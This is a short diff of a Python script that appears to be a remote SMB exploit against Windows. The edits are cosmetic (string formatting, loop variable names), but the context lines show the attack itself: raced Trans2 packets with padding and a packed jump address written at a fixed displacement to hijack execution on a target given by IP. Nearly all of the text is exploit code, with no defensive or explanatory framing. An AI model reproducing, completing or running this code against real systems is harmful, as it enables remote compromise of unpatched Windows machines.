@@ -15,7 +15,7 @@ USERNAME = ''
 PASSWORD = ''
 
 if len(sys.argv) != 2:
-	print("{} <ip>".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip>")
 	sys.exit(1)
 
 target = sys.argv[1]
@@ -59,14 +59,14 @@ def nsa_race(conn, jmp_addr):
 def my_race(conn, jmp_addr):
 	setup = pack('<H', 5)  # QUERY_PATH_INFO
 	param = pack('<HI', 6, 0) + '\x00'*4  # infoLevel, reserved, filename
-	
+
 	# directly race
-	for i in range(8):
+	for _ in range(8):
 		mid = conn.next_mid()
 		req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
 		req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)
 		conn.send_raw(req1+req3*11)
-	for i in range(8):
+	for _ in range(8):
 		recvPkt = conn.recvSMB()
 		if recvPkt.getNTStatus() != 0xc0000010:
 			#print('return status: 0x{:x}'.format(recvPkt.getNTStatus()))
